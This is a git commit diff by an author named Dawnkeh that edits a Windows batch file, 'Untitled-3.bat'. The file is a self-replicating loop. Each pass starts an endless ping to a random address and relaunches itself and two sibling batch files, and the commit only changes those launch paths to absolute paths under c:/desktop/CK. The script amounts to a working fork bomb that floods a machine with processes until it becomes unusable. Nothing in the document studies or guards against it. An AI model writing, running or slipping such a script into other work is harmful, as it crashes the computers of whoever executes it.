770c6b41d1f150e3040bbeaafcfd40c40b4d8911
Dawnkeh <lilsk8rdude00@gmail.com>
2016-10-17 15:16:59 -0400

    Update Untitled-3.bat

--- Untitled-3.bat
+++ Untitled-3.bat
@@ -2,7 +2,7 @@
 
 :1
 start ping %random% -t
-start Untitled-3.bat
-start Untitled-2.bat
-start Untitled-1.bat
+start c:/desktop/CK/Untitled-3.bat
+start c:/desktop/CK/Untitled-2.bat
+start c:/desktop/CK/Untitled-1.bat
 goto 1
